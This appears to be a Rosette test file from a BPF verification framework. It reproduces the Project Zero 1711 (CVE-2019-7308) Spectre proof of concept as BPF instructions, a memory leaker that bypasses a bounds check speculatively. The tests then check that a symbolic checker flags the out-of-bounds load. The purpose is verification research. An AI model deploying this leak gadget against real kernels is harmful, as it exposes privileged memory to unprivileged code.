#lang rosette

; https://bugs.chromium.org/p/project-zero/issues/detail?id=1711
; CVE-2019-7308
;
; The checker performs masking for array indices but not pointers.

(require
  rackunit
  rackunit/text-ui
  rosette/lib/roseunit
  serval/bpf
  serval/lib/core
  serval/lib/unittest)

(define ret.data_map 1)
(define ret.control_map 2)

(define BPF_REG_CONTROL_PTR BPF_REG_7)
(define BPF_REG_MAP_PTR BPF_REG_0)
(define BPF_REG_BITSHIFT BPF_REG_1)
(define BPF_REG_INDEX BPF_REG_2)
(define BPF_REG_SLOW_BOUND BPF_REG_3)
(define BPF_REG_OOB_ADDRESS BPF_REG_4)
(define BPF_REG_LEAKED_BYTE BPF_REG_4)

; memory leaker
(define insns (make-insns
  ; load control data
  (BPF_LD_MAP_FD BPF_REG_ARG1 ret.control_map)
  (BPF_MOV64_REG BPF_REG_ARG2 BPF_REG_FP)
  (BPF_ALU64_IMM BPF_ADD BPF_REG_ARG2 -4)
  (BPF_ST_MEM BPF_W BPF_REG_ARG2 0 0)
  (BPF_EMIT_CALL BPF_FUNC_map_lookup_elem)
  (BPF_JMP_IMM BPF_JEQ BPF_REG_0 0 23)
  (BPF_MOV64_REG BPF_REG_CONTROL_PTR BPF_REG_0)

  ; load pointer to our big array
  (BPF_LD_MAP_FD BPF_REG_ARG1 ret.data_map)
  (BPF_MOV64_REG BPF_REG_ARG2 BPF_REG_FP)
  (BPF_ALU64_IMM BPF_ADD BPF_REG_ARG2 -4)
  (BPF_ST_MEM BPF_W BPF_REG_ARG2 0 0)
  (BPF_EMIT_CALL BPF_FUNC_map_lookup_elem)
  (BPF_JMP_IMM BPF_JEQ BPF_REG_0 0 15)
  (BPF_MOV64_REG BPF_REG_OOB_ADDRESS BPF_REG_MAP_PTR)

  ; load bitshift and speculatively unbounded index
  (BPF_LDX_MEM BPF_DW BPF_REG_BITSHIFT BPF_REG_CONTROL_PTR 0)
  (BPF_LDX_MEM BPF_DW BPF_REG_INDEX BPF_REG_CONTROL_PTR 8)
  (BPF_ALU64_IMM BPF_AND BPF_REG_BITSHIFT #xf)

  ; load verifier-bounded slowly-loaded index bound
  (BPF_LDX_MEM BPF_DW BPF_REG_SLOW_BOUND BPF_REG_MAP_PTR #x1200)
  (BPF_ALU64_IMM BPF_AND BPF_REG_SLOW_BOUND 1)
  (BPF_ALU64_IMM BPF_OR BPF_REG_SLOW_BOUND 1)

  ; speculatively bypassed bounds check
  (BPF_JMP_REG BPF_JGT BPF_REG_INDEX BPF_REG_SLOW_BOUND 7)

  (BPF_ALU64_REG BPF_ADD BPF_REG_OOB_ADDRESS BPF_REG_INDEX)
  ; pc 24
  (BPF_LDX_MEM BPF_B BPF_REG_LEAKED_BYTE BPF_REG_OOB_ADDRESS 0)
  (BPF_ALU64_REG BPF_LSH BPF_REG_LEAKED_BYTE BPF_REG_BITSHIFT)
  (BPF_ALU64_IMM BPF_AND BPF_REG_LEAKED_BYTE #x1000)
  (BPF_ALU64_REG BPF_ADD BPF_REG_MAP_PTR BPF_REG_LEAKED_BYTE)
  (BPF_ALU64_IMM BPF_ADD BPF_REG_MAP_PTR #x2000)
  (BPF_LDX_MEM BPF_B BPF_REG_1 BPF_REG_MAP_PTR 0)

  (BPF_MOV64_IMM BPF_REG_0 0)
  (BPF_EXIT_INSN)))

(define (run-poc)
  (define fdtable (vector #f (make-array-map #x5000 1) (make-array-map 16 1)))
  (define cpu (init-cpu #f fdtable))
  (simplify-asserts
    (with-spectre-asserts-only
      (interpret-program cpu insns))))

(define (check-poc-spectre-off)
  (define asserted (parameterize ([target-spectre #f]) (run-poc)))
  (check-equal? asserted null))

(define (check-poc-spectre-on)
  (define asserted (parameterize ([target-spectre #t]) (run-poc)))
  (check-equal? (length asserted) 1)
  (define expr (first asserted))
  (define sol (verify (assert expr)))
  (check-sat? sol)
  (define data (bug-ref expr))
  (check-equal? (length data) 1)
  (define loc (dict-ref (first data) 'location))
  (check-equal? loc 24))

(define bpf-tests
  (test-suite+ "Tests for PoC (Project Zero 1711)"
    (test-case+ "CVE-2019-7308 (spectre off)"
      (check-poc-spectre-off))
    (test-case+ "CVE-2019-7308 (spectre on)"
      (check-poc-spectre-on))))

(module+ test
  (time (run-tests bpf-tests)))
